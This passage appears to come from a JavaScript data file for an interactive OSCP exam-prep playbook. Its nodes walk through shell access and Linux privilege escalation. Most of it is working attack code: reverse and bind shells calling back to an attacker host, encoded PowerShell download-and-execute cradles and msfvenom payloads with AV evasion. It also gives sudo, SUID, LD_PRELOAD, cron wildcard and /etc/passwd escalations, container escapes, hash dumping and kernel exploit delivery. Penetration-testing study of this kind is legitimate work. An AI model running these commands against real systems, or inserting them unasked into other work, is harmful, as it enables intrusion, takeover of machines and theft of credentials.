# PowerShell one-liner
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"

# PowerShell encoded (bypass execution policy + logging)
# Generate: echo "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')" | iconv -t UTF-16LE | base64 -w0
powershell -nop -w hidden -enc [BASE64]

# msfvenom Windows stageless exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
# Staged (smaller, needs handler)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o staged.exe

# msfvenom Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf

# Reference: https://www.revshells.com`,
    warn: "Shell dies immediately? Check: (1) port reachable from target — try 443/80, (2) AV killing binary — use encoded payload or AMSI bypass, (3) bash not available — try sh or python, (4) /bin/bash path wrong — try /bin/sh.",
    choices: [
      { label: "Shell caught — upgrade TTY", next: "shell_upgrade" },
      { label: "Shell dies immediately — troubleshoot", next: "shell_troubleshoot" },
      { label: "AV killing binary — bypass needed", next: "amsi_bypass" },
      { label: "Need meterpreter instead", next: "shell_meterpreter" },
    ],
  },

  shell_troubleshoot: {
    phase: "SHELL",
    title: "Shell Troubleshooting",
    body: "Shell not catching or dying immediately. Work through this systematically — the failure mode is almost always one of five things.",
    cmd: `# ── DIAGNOSTIC CHECKLIST ─────────────────

# 1. CAN THE TARGET REACH YOU?
# On target:
ping $LHOST -c 1       # ICMP allowed?
curl http://$LHOST      # HTTP out allowed?
# On attacker — watch tcpdump:
sudo tcpdump -i tun0 icmp
sudo tcpdump -i tun0 port $LPORT
# No ping = strict egress — try ports 80, 443, 53

# 2. WRONG PORT — FIREWALL FILTERING
# Retry with common allowed egress ports:
export LPORT=443   # HTTPS — almost never blocked
export LPORT=80    # HTTP
export LPORT=53    # DNS (use for tunnel not reverse shell normally)
nc -nlvp 443

# 3. SHELL BINARY NOT AVAILABLE
# Test what's on the target:
which bash sh python python3 perl ruby nc ncat
# Use whatever is present in the payload

# 4. ENCODING ISSUE (web delivery)
# Spaces and special chars break bash -c in web context
# Use base64 brace expansion — no spaces, no special chars:
echo 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1' | base64 -w0
# Take the output (B64) and deliver as:
bash -c '{echo,B64OUTPUT}|{base64,-d}|{bash,-i}'

# PowerShell must use UTF-16LE encoding (not UTF-8):
echo 'IEX(New-Object Net.WebClient).DownloadString("http://$LHOST/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
powershell -nop -w hidden -enc B64OUTPUT

# Quick test — does base64 decode correctly?
echo "B64OUTPUT" | base64 -d  # verify payload before delivery

# 5. AV/AMSI BLOCKING BINARY
# Switch to: encoded PS, msfvenom with encoding, or manual AMSI bypass
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 \
  -f exe -e x64/xor_dynamic -i 5 -o shell_enc.exe

# 6. INTERACTIVE SHELL NEEDED (su, ssh)
# Some exploits give non-interactive — upgrade immediately
script /dev/null -c bash
python3 -c 'import pty; pty.spawn("/bin/bash")'`,
    warn: "tcpdump is your ground truth. Run it on tun0 BEFORE executing payload. If you see the connection hit your interface but nc catches nothing: wrong port on listener. If nothing hits interface at all: egress filtered or wrong LHOST.",
    choices: [
      { label: "Fixed — shell caught", next: "shell_upgrade" },
      { label: "AV issue — bypass", next: "amsi_bypass" },
      { label: "Port filtered — try bind shell", next: "shell_bind" },
      { label: "Need different approach", next: "reverse_shell" },
    ],
  },

  shell_bind: {
    phase: "SHELL",
    title: "Bind Shell — Outbound Blocked",
    body: "Reverse shell requires outbound from target. If egress is fully filtered, flip it — bind shell listens ON the target, you connect TO it. Requires inbound access to target port.",
    cmd: `# ── BIND SHELL PAYLOADS ──────────────────
# nc on target (if -e available)
nc -nlvp 4444 -e /bin/bash

# nc without -e (use mkfifo)
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -nlvp 4444 > /tmp/f

# Python3 bind
python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell bind (Windows)
powershell -nop -w hidden -c "$l=New-Object Net.Sockets.TcpListener('0.0.0.0',4444);$l.start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close();$l.Stop()"

# msfvenom bind (Linux)
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf

# msfvenom bind (Windows)
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe

# ── CONNECT FROM ATTACKER ─────────────────
nc $ip 4444`,
    warn: "Bind shells on OSCP exam machines are risky — another candidate could connect to your bind shell. Use a non-obvious port and close it when done. Reverse shells are always preferred.",
    choices: [
      { label: "Bind shell connected — upgrade TTY", next: "shell_upgrade" },
      { label: "Port blocked inbound too — web shell only", next: "iis_aspx" },
    ],
  },

  shell_meterpreter: {
    phase: "SHELL",
    title: "Meterpreter Shell",
    body: "Meterpreter is allowed on OSCP for 3 of 5 machines. Staged payload needs a handler. Stageless is simpler. Know the difference and know when to use each.",
    cmd: `# ── STAGED vs STAGELESS ──────────────────
# Staged (windows/x64/meterpreter/reverse_tcp):
#   Small stager connects back → downloads full payload
#   Needs: multi/handler running before execution
#   Smaller file, better for size-limited delivery

# Stageless (windows/x64/meterpreter_reverse_tcp):
#   Full payload in one binary
#   No handler dependency — nc won't work, need handler
#   Better AV detection but simpler setup

# ── GENERATE PAYLOAD ─────────────────────
# Staged Windows x64
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f exe -o met_staged.exe

# Stageless Windows x64
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f exe -o met_stageless.exe

# Linux staged
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f elf -o met_linux.elf

# ── HANDLER ──────────────────────────────
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
run -j   # run as job, catches multiple sessions

# ── USEFUL METERPRETER COMMANDS ──────────
sysinfo          # OS info
getuid           # current user
getsystem        # attempt privilege escalation
hashdump         # dump SAM hashes (needs SYSTEM)
upload shell.exe C:\\Windows\\Temp\\shell.exe
download C:\\Users\\Administrator\\Desktop\\proof.txt
shell            # drop to cmd.exe
migrate [PID]    # migrate to stable process
run post/multi/recon/local_exploit_suggester`,
    warn: "OSCP limits meterpreter to 3 of 5 exam machines. Use it strategically — not as your default. The exam tests whether you can operate without it. Save it for machines where it provides clear value.",
    choices: [
      { label: "Meterpreter session — post-exploit", next: "windows_post_exploit" },
      { label: "Meterpreter on Linux", next: "linux_post_exploit" },
      { label: "AV killed it — bypass first", next: "amsi_bypass" },
    ],
  },

  shell_upgrade: {
    phase: "SHELL",
    title: "Shell Stabilization — Full TTY",
    body: "Do this before anything else. A dumb shell drops on Ctrl+C, breaks on sudo, and hides passwords. A full PTY feels like SSH. Three paths: Python pty (most common), socat (cleanest — full PTY immediately), or script. Windows is completely different — ConPtyShell or rlwrap. pwncat-cs handles stabilization automatically if you caught the shell with it.",
    cmd: `# ── METHOD 1: PYTHON PTY (most common) ───
# Step 1 — spawn PTY inside the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'    # if python3 not found
script -qc /bin/bash /dev/null                     # script fallback

# Step 2 — background the shell
# Press: Ctrl+Z

# Step 3 — fix YOUR terminal to raw mode (no echo)
stty raw -echo; fg
# ↑ 'fg' brings back the shell in raw mode

# Step 4 — fix the PTY to match your terminal
export TERM=xterm-256color
stty rows $(tput lines) cols $(tput cols)   # match your actual terminal size
# Or set manually:
stty rows 50 columns 220

# Step 5 — clean up environment
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash

# ── METHOD 2: SOCAT (cleanest — immediate full PTY) ──
# On attacker — socat listener (instead of nc):
socat file:\`tty\`,raw,echo=0 tcp-listen:$LPORT

# On target — socat reverse shell (upload socat binary or use static):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT

# Static socat binary (if not installed on target):
wget http://$LHOST/socat -O /tmp/socat && chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT

# ── METHOD 3: PWNCAT-CS (automated) ──────
# Catch with pwncat-cs — it handles PTY automatically:
pwncat-cs -lp $LPORT
# After connection:
# Ctrl+D → drops to pwncat menu
# (local)$ upload linpeas.sh /tmp/lp.sh   ← built-in file transfer
# (local)$ back                            ← back to shell

# ── WINDOWS — STABILIZATION ──────────────
# rlwrap (wraps nc with readline — arrows/history work)
rlwrap nc -nlvp $LPORT

# ConPtyShell — full Windows PTY (best option)
# On attacker:
stty raw -echo; nc -nlvp $LPORT
# On Windows target (PowerShell):
IEX(IWR http://$LHOST/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $LHOST $LPORT

# Evil-WinRM (if WinRM open — best Windows shell experience)
evil-winrm -i $ip -u administrator -p 'Password123!'
evil-winrm -i $ip -u administrator -H NTLM_HASH   # pass the hash

# ── TMUX DISCIPLINE ───────────────────────
# ALWAYS run inside tmux — shell die = session preserved
# Quick setup:
tmux new -s oscp
# Prefix: Ctrl+B
# Split panes: Ctrl+B % (vertical) / Ctrl+B " (horizontal)
# Rename window: Ctrl+B ,
# Detach: Ctrl+B D
# Reattach: tmux attach -t oscp
# Log everything: Ctrl+B : → pipe-pane -o 'cat >>~/tmux.log'`,
    warn: "Ctrl+Z + stty raw -echo + fg must be done as ONE sequence without typing anything between stty and fg. If you see your terminal break (no input visible), type 'reset' blind and press Enter — it will restore sane mode. On target shells without python3, try: script /dev/null -c bash, then the same stty sequence. Always work inside tmux — if your VPN drops and the shell dies, the tmux session keeps your notes and context.",
    choices: [
      { label: "Linux shell — start privesc", next: "linux_post_exploit" },
      { label: "Windows shell — start privesc", next: "windows_post_exploit" },
      { label: "Shell keeps dying — troubleshoot", next: "shell_troubleshoot" },
      { label: "New subnet visible — pivot", next: "pivot_start" },
    ],
  },

  // ══════════════════════════════════════════
  //  LINUX PRIVESC
  // ══════════════════════════════════════════
  linux_post_exploit: {
    phase: "LINUX",
    title: "Linux — Initial Foothold",
    body: "You have a shell. Orient before you enumerate — you need to understand who you are, what you can reach, and whether any quick wins are immediately visible. Run these commands in order: identity → OS → network → users → quick privesc checks. The goal of this phase is to pick the right next step, not to find everything. Stabilize your shell first if you haven't — a dumb shell will fail on sudo and hide password prompts.",
    cmd: `# ── IDENTITY ─────────────────────────────
id && whoami
# uid=0 = already root. uid=33(www-data) = web service, limited.
# Note your username — it's your pivot for sudo/suid checks

# ── OS + KERNEL ───────────────────────────
uname -a                          # kernel version → searchsploit
cat /etc/os-release               # distro + version
cat /proc/version
# Note: kernel < 4.4 → DirtyC0w candidates

# ── NETWORK POSITION ──────────────────────
ip a                              # all interfaces — look for eth1/ens33 (internal)
ip route                          # routing table — other subnets?
cat /etc/hosts                    # static hostname mappings
ss -tulpn                         # listening services (may reveal local-only targets)
# If you see 127.0.0.1:PORT → service only reachable locally — port forward it

# ── USERS ────────────────────────────────
cat /etc/passwd | grep -v nologin | grep -v false   # interactive users
cat /etc/group                    # group memberships — look for docker,lxd,sudo,disk,adm
ls /home/                         # whose home dirs exist?
ls -la /home/*/                   # what's in them?

# ── GRAB THE FLAG ─────────────────────────
find / -name "local.txt" -o -name "proof.txt" 2>/dev/null | xargs cat 2>/dev/null

# ── QUICK WINS — CHECK BEFORE RUNNING LINPEAS ──
sudo -l                           # sudo rights — if anything here go straight to sudo_check
find / -perm -u=s -type f 2>/dev/null   # SUID binaries — run through GTFOBins
cat ~/.bash_history               # previous commands — often contains creds
env                               # environment variables — API keys, passwords
ls -la /opt /srv /var/backups /var/www 2>/dev/null   # non-standard dirs

# ── WRITEABLE DIRECTORIES ─────────────────
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -20
# /tmp /dev/shm = always writable — use for tool drops
# /var/www/html = webroot writable → drop webshell
# /etc = writable → game over (add user to /etc/passwd)

# ── ACTIVE PROCESSES ──────────────────────
ps aux                            # running processes — what is root running?
ps aux | grep root                # root-owned processes specifically
# Look for: cron scripts, custom daemons, web apps, backup scripts`,
    warn: "Check sudo -l and SUID before running LinPEAS — a sudo misconfiguration or GTFOBins SUID binary can give root in 30 seconds. LinPEAS takes 3-5 minutes and produces a wall of output; quick manual checks first means you don't waste time if the win is trivial. If ip route shows a second subnet, note it immediately — that's your pivot path and you need it before you lose context.",
    choices: [
      { label: "sudo -l shows rights — escalate now", next: "sudo_check" },
      { label: "SUID binary found — GTFOBins", next: "suid_check" },
      { label: "New subnet in ip route — pivot", next: "pivot_start" },
      { label: "Run LinPEAS (automated)", next: "linpeas" },
      { label: "Internal port in ss -tulpn — port forward", next: "pivot_start" },
    ],
  },

  linpeas: {
    phase: "LINUX",
    title: "LinPEAS",
    body: "Transfer and run. Tee to a file so you can grep it later. Prioritize RED findings first, then YELLOW. Don't just read — grep for keywords.",
    cmd: `# Transfer
python3 -m http.server 80   # on attacker

wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh | tee /tmp/lp_out.txt

# Grep results for key vectors
grep -i "sudo\\|suid\\|cron\\|writable\\|password\\|key\\|token" /tmp/lp_out.txt

# Also run pspy for process monitoring
wget http://$LHOST/pspy64 -O /tmp/pspy
chmod +x /tmp/pspy && /tmp/pspy`,
    warn: null,
    choices: [
      { label: "sudo rights found", next: "sudo_check" },
      { label: "SUID binary found", next: "suid_check" },
      { label: "Cron job found", next: "cron_check" },
      { label: "Interesting group membership (docker/lxd/disk)", next: "linux_privesc_extra" },
      { label: "Kernel looks vulnerable", next: "kernel_exploit" },
      { label: "Nothing obvious — hunt passwords in files", next: "linux_password_hunt" },
      { label: "Nothing obvious — deep manual enum", next: "linux_manual_enum" },
    ],
  },

  sudo_check: {
    phase: "LINUX",
    title: "Sudo Rights",
    body: "sudo -l is always the first manual check. Anything here goes straight to GTFOBins. LD_PRELOAD and env_keep abuse are often overlooked.",
    cmd: `sudo -l
# Read the output carefully:
# (root) NOPASSWD: /usr/bin/vim   → no password needed, run as root
# (ALL) ALL                        → full root access
# env_keep+=LD_PRELOAD             → LD_PRELOAD abuse (see below)
# env_keep+=LD_LIBRARY_PATH        → LD_LIBRARY_PATH abuse

# GTFOBins one-liners for common findings:
# sudo vim      → :!/bin/bash
# sudo nano     → Ctrl+R Ctrl+X then: reset; sh 1>&0 2>&0
# sudo find     → sudo find . -exec /bin/sh \\; -quit
# sudo python3  → sudo python3 -c 'import os; os.system("/bin/bash")'
# sudo less     → sudo less /etc/passwd → !/bin/bash
# sudo awk      → sudo awk 'BEGIN {system("/bin/bash")}'
# sudo env      → sudo env /bin/sh
# sudo tee      → echo "root2:HASH:0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
# sudo cp       → cp /etc/sudoers /tmp/s; echo "user ALL=(ALL) NOPASSWD:ALL" >> /tmp/s; sudo cp /tmp/s /etc/sudoers

# ── LD_PRELOAD ABUSE ──────────────────────
# Requires: env_keep+=LD_PRELOAD in sudo -l output
# Step 1: Write a shared library that spawns a shell
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
# Step 2: sudo any allowed binary with LD_PRELOAD pointing to your lib
sudo LD_PRELOAD=/tmp/shell.so vim    # replace vim with any NOPASSWD binary
# Result: bash shell as root

# ── SUDO VERSION EXPLOIT ──────────────────
# Baron Samedit — sudo < 1.9.5p2 (CVE-2021-3156)
sudo --version
# If vulnerable:
# sudoedit -s '\' $(python3 -c 'print("A"*65536)')`,
    warn: "NOPASSWD entries are the fastest win — no cracking needed. LD_PRELOAD only works when env_keep+=LD_PRELOAD appears in the sudo -l output; without it, sudo strips the environment variable before execution. Always run sudo -l first even if you think you have no sudo rights — NOPASSWD rules on specific binaries are common on OSCP.",
    choices: [
      { label: "GTFOBins worked — ROOT!", next: "got_root_linux" },
      { label: "Nothing useful — check SUID", next: "suid_check" },
    ],
  },

  suid_check: {
    phase: "LINUX",
    title: "SUID Binaries",
    body: "Find every SUID binary and check each one on GTFOBins. Custom SUID binaries with path injection or buffer overflows are common OSCP vectors.",
    cmd: `find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Check each on https://gtfobins.github.io (SUID filter)

# Common GTFOBins SUID:
# find    → ./find . -exec /bin/sh -p \\; -quit
# bash    → ./bash -p
# vim     → ./vim -c ':py import os; os.execl("/bin/sh","sh","-p")'
# python  → ./python -c 'import os; os.execl("/bin/sh","sh","-p")'
# cp      → cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p

# Custom SUID binary — check for path injection
strings /path/to/suid_binary | grep -v "/"   # unqualified commands?
ltrace /path/to/suid_binary                  # library calls
strace /path/to/suid_binary                  # syscalls`,
    warn: null,
    choices: [
      { label: "GTFOBins SUID exploit worked — ROOT!", next: "got_root_linux" },
      { label: "Custom binary — path hijack worked", next: "got_root_linux" },
      { label: "Nothing — check cron", next: "cron_check" },
    ],
  },

  cron_check: {
    phase: "LINUX",
    title: "Cron Jobs",
    body: "Scripts run by root on a schedule that you can write to are privesc gold. Use pspy to catch jobs that don't appear in crontab.",
    cmd: `cat /etc/crontab
ls -la /etc/cron*
crontab -l
cat /etc/cron.d/*

# pspy — watch for root processes you can't see in crontab
/tmp/pspy64
# Watch for: UID=0 processes, scripts called from writable paths

# ── WRITABLE SCRIPT ───────────────────────
# If you find a script called by root cron that you can write to:
echo 'chmod +s /bin/bash' >> /path/to/script.sh
# Wait for next execution, then:
/bin/bash -p   # -p preserves effective UID

# ── PATH INJECTION IN CRON ────────────────
# If crontab has PATH= and an early writable dir, or calls unqualified binary:
# Example: PATH=/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# And cron runs: curl http://...  (no full path)
echo '#!/bin/bash' > /tmp/curl
echo 'chmod +s /bin/bash' >> /tmp/curl
chmod +x /tmp/curl
# Wait for cron — /tmp/curl runs as root instead of /usr/bin/curl

# ── WILDCARD INJECTION ────────────────────
# If root cron runs: tar -czf backup.tar.gz /var/www/html/*
# Or: chown www-data:www-data /uploads/*
# Wildcard * expands to filenames in the directory — filenames become arguments
# Exploit tar wildcard:
cd /var/www/html   # or wherever the wildcard runs
echo 'chmod +s /bin/bash' > /tmp/privesc.sh
chmod +x /tmp/privesc.sh
# Create filenames that become tar arguments:
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh /tmp/privesc.sh'
# When cron runs tar *, these filenames become: tar --checkpoint=1 --checkpoint-action=exec=sh /tmp/privesc.sh ...
# Wait for cron, then: /bin/bash -p

# Exploit chown wildcard (same idea — create filenames as flags):
touch -- '--reference=/tmp/evil'  # chown inherits permissions from reference file`,
    warn: "Wildcard injection is one of the most reliable but most overlooked cron privesc paths. Any cron job using * in a directory you can write to is potentially vulnerable — tar, chown, rsync, and cp all have exploitable flag options. pspy is essential: many cron jobs run every minute but don't appear in /etc/crontab — they're in /etc/cron.d/, /etc/cron.hourly/, or are user crontabs.",
    choices: [
      { label: "Cron exploitation worked — ROOT!", next: "got_root_linux" },
      { label: "No writable cron targets — try capabilities", next: "linux_manual_enum" },
    ],
  },

  linux_manual_enum: {
    phase: "LINUX",
    title: "Linux — Deep Manual Enumeration",
    body: "LinPEAS ran and nothing obvious came up. Go deeper manually — each category below catches things automated tools miss or misread. Work through them in order: capabilities and writable files are the fastest wins, then NFS, then process analysis with pspy, then /etc/passwd writability. The goal is to understand the full attack surface, not just run commands.",
    cmd: `# ── LINUX CAPABILITIES ────────────────────
getcap -r / 2>/dev/null
# High-value capabilities:
# cap_setuid     → setuid(0) → root shell
# cap_net_raw    → packet capture → may sniff creds
# cap_dac_read_search → read any file (bypass permissions)
# cap_sys_admin  → mount namespaces, many privesc paths

# cap_setuid exploit (python3, perl, ruby, etc.):
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# cap_dac_read_search (tar, xxd):
# xxd /etc/shadow | xxd -r   # read shadow file
# tar -cvf /dev/null /etc/shadow 2>&1 | head   # may leak contents

# ── NFS NO_ROOT_SQUASH ────────────────────
cat /etc/exports
showmount -e $ip
# Look for: no_root_squash
# If present → mount the share from Kali as root → create SUID binary

# On Kali (as root):
# mount -t nfs $ip:/shared /mnt/nfs -o nolock
# cp /bin/bash /mnt/nfs/rootbash
# chmod +s /mnt/nfs/rootbash
# On target: /shared/rootbash -p   → root shell

# ── WRITABLE /ETC/PASSWD ──────────────────
ls -la /etc/passwd
# If writable → add a root user:
openssl passwd -1 -salt x pass123    # generates: $1$x$HASH
echo 'r00t:HASHHERE:0:0::/root:/bin/bash' >> /etc/passwd
su r00t   # password: pass123

# Alternatively — if you can write any file root reads (cron, service):
# echo 'chmod +s /bin/bash' >> /path/writable/root/runs

# ── PSPY — PROCESS MONITORING ─────────────
# Catches cron jobs and scheduled processes that don't appear in crontab
wget http://$LHOST/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy
/tmp/pspy
# Watch for: UID=0 processes, scripts run from writable paths

# ── WRITABLE FILES OWNED BY ROOT ─────────
# Files root owns that you can write = cron job path, service script
find / -writable -not -path "/proc/*" -not -path "/sys/*" \\
  -not -path "/dev/*" -type f 2>/dev/null
# Filter to interesting ones:
find / -writable -not -path "/proc/*" -not -path "/sys/*" \\
  -type f 2>/dev/null | grep -vE "^/tmp|^/dev/shm" | head -30

# ── RECENTLY MODIFIED FILES ───────────────
find / -mmin -15 -type f -not -path "/proc/*" 2>/dev/null
# Anything changed recently while you were on the box = active process

# ── GROUP MEMBERSHIP PRIVESC ──────────────
id    # look for: docker, lxd, disk, adm, shadow, sudo
# docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# lxd group:
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc && lxc exec privesc /bin/sh
# disk group:
debugfs /dev/sda1
debugfs:  cat /etc/shadow
# adm group: read /var/log/auth.log, /var/log/syslog (may contain passwords)

# ── INTERNAL NETWORK SERVICES ─────────────
ss -tulpn
netstat -tulpn 2>/dev/null
# Services on 127.0.0.1 not in original nmap:
# Set up port forward to access from Kali:
ssh -R 8080:127.0.0.1:8080 kali@$LHOST -N   # if you have SSH out`,
    warn: "pspy is often the key to finding cron jobs that don't show up in crontab — run it for at least 2-3 minutes and watch for UID=0 processes. The docker group is an instant root regardless of any other hardening. Writable /etc/passwd is rare but still appears on OSCP boxes — always check permissions with ls -la /etc/passwd. Recently modified files (find -mmin -15) reveal what the system is actively doing and often point directly to the privesc vector.",
    choices: [
      { label: "Capabilities exploit — root via setuid", next: "got_root_linux" },
      { label: "NFS no_root_squash — SUID via mount", next: "got_root_linux" },
      { label: "Writable /etc/passwd — added root user", next: "got_root_linux" },
      { label: "Docker/LXD group — container escape", next: "linux_privesc_extra" },
      { label: "pspy found writable cron script", next: "cron_check" },
      { label: "Internal port — port forward and attack", next: "pivot_start" },
      { label: "Nothing — kernel exploit last resort", next: "kernel_exploit" },
    ],
  },

  kernel_exploit: {
    phase: "LINUX",
    title: "Kernel Exploit",
    body: "Last resort — kernel exploits can crash the machine. Compile carefully, transfer correctly, test. DirtyCow is classic but notoriously unstable. The compilation step is where most people fail — wrong arch, missing headers, or compiling on Kali instead of the target.",
    cmd: `# ── STEP 1: IDENTIFY KERNEL + OS ─────────
uname -a           # full kernel version string
uname -r           # just the release number
cat /etc/os-release
cat /etc/issue
arch               # x86_64 or i686 — must match compiled binary

# ── STEP 2: SEARCHSPLOIT THE KERNEL ───────
searchsploit linux kernel $(uname -r | cut -d'-' -f1)
searchsploit linux privilege escalation
searchsploit ubuntu $(lsb_release -r | awk '{print $2}')   # distro-specific

# Common exploits by kernel version:
# DirtyCow     CVE-2016-5195   kernel 2.6.22 – 4.8.3   (very common on OSCP)
# overlayfs    CVE-2015-1328   Ubuntu 12.04/14.04/15.10
# Baron Samedit CVE-2021-3156  sudo < 1.9.5p2 (any distro)
# Dirty Pipe   CVE-2022-0847   kernel 5.8 – 5.16.11
# PwnKit       CVE-2021-4034   pkexec (most Linux distros pre-2022)

# ── STEP 3: COPY + READ THE EXPLOIT ───────
searchsploit -m <EDB-ID>
# Read it — check: required compiler flags, dependencies, any hardcoded paths

# ── STEP 4: COMPILE ───────────────────────
# CRITICAL: compile for the TARGET architecture, not Kali
# Check target arch first: uname -m (x86_64 or i686)

# Standard C compile:
gcc exploit.c -o exploit

# If target is 32-bit and Kali is 64-bit (cross-compile):
gcc -m32 exploit.c -o exploit

# If exploit requires specific flags (read the source comments):
gcc exploit.c -o exploit -pthread -lcrypt
gcc exploit.c -o exploit -lpthread

# Cross-compile for Windows from Kali:
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe          # 64-bit Windows
i686-w64-mingw32-gcc exploit.c -o exploit.exe             # 32-bit Windows
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32  # if uses winsock

# ── STEP 5: TRANSFER TO TARGET ────────────
# Kali: python3 -m http.server 80
# Target (Linux):
wget http://$LHOST/exploit -O /tmp/exploit
chmod +x /tmp/exploit
/tmp/exploit

# Target (Windows):
certutil -urlcache -split -f http://$LHOST/exploit.exe C:\\Windows\\Temp\\exploit.exe
C:\\Windows\\Temp\\exploit.exe

# ── STEP 6: IF COMPILE FAILS ──────────────
# Missing headers: apt install gcc-multilib (for -m32 support)
# Missing lib: apt install libssl-dev / libcrypt-dev
# Try compiling ON the target if gcc is available:
# which gcc && gcc exploit.c -o /tmp/exploit`,
    warn: "Kernel exploits can destabilize the machine — have revert ready before firing. Compile for the target arch: x86_64-w64-mingw32-gcc for Windows, -m32 flag for 32-bit Linux from a 64-bit Kali. The most common failure is compiling on Kali (64-bit) and running on a 32-bit target. Always check arch first with 'uname -m' or 'file /bin/ls'.",
    choices: [
      { label: "Kernel exploit worked — ROOT!", next: "got_root_linux" },
      { label: "Machine crashed — reverted and re-enumerate", next: "linux_post_exploit" },
    ],
  },

  got_root_linux: {
    phase: "LINUX",
    title: "ROOT — Linux",
    body: "You're root. Get the proof screenshot right: whoami + id + hostname + ip + cat proof.txt — all visible in one screenshot.",
    cmd: `id && whoami && hostname
ip a
cat /root/proof.txt

# Screenshot checklist:
# ✅ id showing uid=0(root)
# ✅ hostname visible
# ✅ IP visible (ip a or ifconfig)
# ✅ cat /root/proof.txt showing hash
# ✅ All in ONE screenshot`,
    warn: null,
    choices: [
      { label: "New subnet in ip route — pivot!", next: "pivot_start" },
      { label: "Back to start — next machine", next: "start" },
    ],
  },

  // ══════════════════════════════════════════
  //  WINDOWS PRIVESC
  // ══════════════════════════════════════════
  windows_post_exploit: {
    phase: "WINDOWS",
    title: "Windows — Initial Foothold",
    body: "You have a Windows shell. Orient before automating — who you are and what privileges you have determines everything. Token privileges are your fastest win: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is instant SYSTEM via potato. Integrity level tells you whether UAC is in the way. Network position tells you if there are subnets to pivot into. Do this manual triage first — it takes 60 seconds and may save you 30 minutes of WinPEAS output.",
    cmd: `# ── IDENTITY + INTEGRITY ─────────────────
whoami
whoami /all        # everything: username, groups, privileges, token integrity
# Integrity levels:
#   Low       = restricted process (browser sandbox) — very limited
#   Medium    = standard user — most OSCP starting points
#   High      = admin with UAC elevation — already powerful
#   System    = NT AUTHORITY\SYSTEM — game over

# ── TOKEN PRIVILEGES — CHECK FIRST ────────
whoami /priv
# Instant SYSTEM if present:
#   SeImpersonatePrivilege        → Potato attack
#   SeAssignPrimaryTokenPrivilege → Potato attack
#   SeBackupPrivilege             → read any file (SAM/SYSTEM dump)
#   SeRestorePrivilege            → write any file
#   SeTakeOwnershipPrivilege      → take ownership of any object
#   SeDebugPrivilege              → attach to LSASS → mimikatz
#   SeLoadDriverPrivilege         → load malicious driver

# ── OS + PATCH LEVEL → SEARCHSPLOIT ──────
systeminfo
systeminfo | findstr /i "os name\|os version\|hotfix"
wmic qfe get Caption,Description,HotFixID,InstalledOn   # installed patches

# Feed systeminfo directly to windows-exploit-suggester:
# Step 1: save systeminfo output to a file
systeminfo > sysinfo.txt
# Transfer sysinfo.txt to Kali, then:
